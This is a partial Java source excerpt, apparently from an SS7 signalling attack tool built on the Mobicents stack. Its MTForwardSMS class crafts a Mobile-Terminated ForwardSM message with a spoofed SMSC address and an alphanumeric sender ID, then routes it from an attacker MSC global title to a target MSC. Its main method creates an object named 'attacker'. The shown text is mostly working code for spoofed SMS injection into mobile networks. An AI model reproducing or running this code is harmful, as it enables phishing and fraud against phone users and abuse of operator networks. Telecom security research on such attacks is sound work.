...
abstract class MTSMSLowLevel implements MAPDialogListener, MAPServiceSmsListener {
...
public class MTForwardSMS extends MTSMSLowLevel  {

    private static Logger logger = Logger.getLogger(MTForwardSMS.class);
    ...
    private void initiateMTSMS() throws MAPException {
        try {
            AddressString orig_smsc = this.mapProvider.getMAPParameterFactory().createAddressString(AddressNature.international_number,
                    NumberingPlan.ISDN, attacker_spoofed_smsc);
            ...
            AddressField oa = new AddressFieldImpl(TypeOfNumber.Alphanumeric,NumberingPlanIdentification.Unknown,attacker_senderID);
            ...
            DataCodingScheme dcs = this.mapProvider.getMAPSmsTpduParameterFactory().createDataCodingScheme(0);
            UserData userData = this.mapProvider.getMAPSmsTpduParameterFactory().createUserData(sms_content,
                    dcs,null,null);


            SmsDeliverTpduImpl tpdu = new SmsDeliverTpduImpl(false, false,
                    false, true, oa, pi, timeStamp, userData);

            SmsSignalInfoImpl sm_Rp_UI = new SmsSignalInfoImpl(tpdu, null);

            GlobalTitle0100 GtAttackerMSC = this.sccpProvider.getParameterFactory().createGlobalTitle(
                    attacker_msc, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);

            GlobalTitle0100 GtTargetMSC = this.sccpProvider.getParameterFactory().
                    createGlobalTitle(target_msc, 0,
            ...
            SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory().
                    createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, GtAttackerMSC, CLIENT_SPC, SSN_Client);
            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
                    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, GtTargetMSC, SERVER_SPC, SSN_Server);
    ...
    public static void main(String args[]) {
        ...
        final MTForwardSMS attacker = new MTForwardSMS();
